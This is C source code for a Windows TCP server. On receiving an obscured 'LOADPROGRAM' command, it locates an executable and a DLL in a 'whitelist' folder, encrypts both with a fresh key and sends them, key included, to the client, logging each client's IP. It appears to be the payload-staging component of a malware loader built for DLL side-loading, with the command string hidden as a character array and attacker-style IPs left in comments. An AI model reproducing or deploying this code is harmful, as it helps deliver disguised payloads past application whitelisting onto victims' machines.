
#include <windows.h>
#include <winsock.h>
#include "Public.h"
#pragma comment(lib,"ws2_32.lib")





int FindWhileListAndDll(char * szcurdir,char * szsubdir,char * lpexe,char * lpdll){
	char szdir[MAX_PATH];
	lstrcpyA(szdir,szcurdir);
	int ret = 0;
	lstrcatA(szdir,"\\");
	lstrcatA(szdir,szsubdir);
	lstrcatA(szdir,"\\");

	char szfinddir[MAX_PATH];
	lstrcpyA(szfinddir,szdir);
	char * szAllFileFormat = "*.*";
	lstrcatA(szfinddir,szAllFileFormat);

	WIN32_FIND_DATAA stfind={0};
	
	int existpe = FALSE;
	int existdll = FALSE;
	HANDLE hfind = FindFirstFileA(szfinddir,&stfind);
	if (hfind == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	do 
	{
		if ( (stfind.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0)
		{
			if (strstr(stfind.cFileName,".dll") )
			{
				lstrcpyA(lpdll,szdir);
				lstrcatA(lpdll,stfind.cFileName);
				existdll = TRUE;
			}else if (strstr(stfind.cFileName,".exe"))
			{
				lstrcpyA(lpexe,szdir);
				lstrcatA(lpexe,stfind.cFileName);
				existpe = TRUE;
			}
		}
	} while (FindNextFileA(hfind,&stfind));

	FindClose(hfind);

	if (existpe & existdll)
	{
		return TRUE;
	}

	return FALSE;
}




int __stdcall SendWhiteListAndrDllFromServer(DWORD dwIP){

	int iRet = 0;
	SOCKET s = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	if (s == INVALID_SOCKET)
	{
		return FALSE;
	}

	sockaddr_in stAddr = {0};
	stAddr.sin_family = AF_INET;
	stAddr.sin_port = ntohs(SERVER_PORT);
	stAddr.sin_addr.S_un.S_addr = dwIP;//inet_addr("192.168.20.74");//1.32.216.22

	iRet = bind(s,(sockaddr*)&stAddr,sizeof(sockaddr_in));
	if (iRet == INVALID_SOCKET)
	{
		closesocket(s);
		return FALSE;
	}

	iRet = listen(s,MAX_LISTEN_COUNT);
	if (iRet == INVALID_SOCKET)
	{
		closesocket(s);
		return FALSE;
	}


	char szLoadProgramCmd[] = {'L','O','A','D','P','R','O','G','R','A','M',0};
	while (TRUE)
	{
		sockaddr_in stClient = {0};
		int iClientLen = sizeof(sockaddr_in);

		SOCKET sc = accept(s,(sockaddr*)&stClient,&iClientLen);
		if (sc != INVALID_SOCKET)
		{
			char szFlag[COMMAND_BUF_SIZE];
			int iLen = recv(sc,szFlag,COMMAND_BUF_SIZE,0);
			if (iLen <= 0)
			{
				closesocket(sc);
				continue;
			}

			if (memcmp(szFlag,szLoadProgramCmd,lstrlenA(szLoadProgramCmd)) == 0)
			{
				char szcurdir[MAX_PATH];
				int ret = GetCurrentDirectoryA(MAX_PATH,szcurdir);

				char szexefn[MAX_PATH] = {0};
				char szdllfn[MAX_PATH] = {0};
				ret = FindWhileListAndDll(szcurdir,WHITELIST_FOLDER,szexefn,szdllfn);
				if (ret == FALSE)
				{
					closesocket(sc);
					continue;
				}

				char szexename[MAX_PATH] = {0};
				char szdllname[MAX_PATH] = {0};
				ret = GetNameFromFullName(szexefn,szexename);
				ret = GetNameFromFullName(szdllfn,szdllname);
				int exenamelen = lstrlenA(szexename);
				int dllnamelen = lstrlenA(szdllname);

				unsigned char key[CRYPT_KEY_SIZE];
				GenerateCryptKey(key);

				HANDLE hexe = CreateFileA(szexefn,GENERIC_READ | GENERIC_WRITE,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
				if (hexe == INVALID_HANDLE_VALUE)
				{
					closesocket(sc);
					continue;
				}

				DWORD dwExeSize = GetFileSize(hexe,0);

				HANDLE hDll = CreateFileA(szdllfn,GENERIC_READ | GENERIC_WRITE,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
				if (hDll == INVALID_HANDLE_VALUE)
				{
					CloseHandle(hexe);
					closesocket(sc);
					continue;
				}

				DWORD dwDllSize = GetFileSize(hDll,0);

				int SendSize = sizeof(DWORD) + sizeof(DWORD) + 
					sizeof(DWORD) + exenamelen + sizeof(DWORD) + dwExeSize + 
					sizeof(DWORD) + dllnamelen + sizeof(DWORD) + dwDllSize + CRYPT_KEY_SIZE;
				char * pBuf = new char [SendSize];


				DWORD dwCnt = 0;

				int offset = 0;
				*(DWORD*)(pBuf + offset) = SendSize;
				offset += sizeof(DWORD);

				*(DWORD*)(pBuf + offset) = CMD_SENDWHITELISTANDDLL;
				offset += sizeof(DWORD);

				//offset = offset + sizeof(DWORD) + sizeof(DWORD);
				*(DWORD*)(pBuf + offset) = exenamelen;
				offset += sizeof(DWORD);

				memmove(pBuf + offset,szexename,exenamelen);
				offset += exenamelen;

				*(DWORD*)(pBuf + offset) = dwExeSize;
				offset += sizeof(DWORD);

				iRet = ReadFile(hexe,pBuf + offset,dwExeSize,&dwCnt,0);
				CloseHandle(hexe);

				if (iRet == FALSE || dwCnt != dwExeSize)
				{
					closesocket(sc);
					delete [] pBuf;
					CloseHandle(hDll);
					continue;
				}

				CryptData(pBuf + offset,dwExeSize,key);

				offset += dwExeSize;
				*(DWORD*)(pBuf + offset) = dllnamelen;
				offset += sizeof(DWORD);

				memmove(pBuf + offset,szdllname,dllnamelen);
				offset += dllnamelen;

				*(DWORD*)(pBuf + offset ) = dwDllSize;
				offset += sizeof(DWORD);
				iRet = ReadFile(hDll,pBuf + offset,dwDllSize,&dwCnt,0);
				CloseHandle(hDll);
				if (iRet == FALSE || dwCnt != dwDllSize)
				{
					closesocket(sc);
					delete [] pBuf;
					continue;
				}

				CryptData(pBuf + offset,dwDllSize,key);

				offset += dwDllSize;
				memmove(pBuf + offset,key,CRYPT_KEY_SIZE);
				offset += CRYPT_KEY_SIZE;

				iRet = send(sc,pBuf,SendSize,0);
				delete [] pBuf;
				closesocket(sc);
				if (iRet != SendSize)
				{
					WriteLogFile("send packet error\r\n");
					continue;
				}

				char szlog[1024];
				unsigned char cip[4];
				memmove(cip,&stClient.sin_addr.S_un.S_addr,4);
				wsprintfA(szlog,"send client whilelist and dll ok,ip:%u:%u:%u:%u,port:%u,socket:%u\r\n",cip[0],cip[1],cip[2],cip[3],stClient.sin_port,sc);
				WriteLogFile(szlog);
			}else{
				closesocket(sc);
				WriteLogFile("recv unrecognized packet\r\n");
				continue;
			}
		}else{
			continue;
		}
	}

	return TRUE;
}
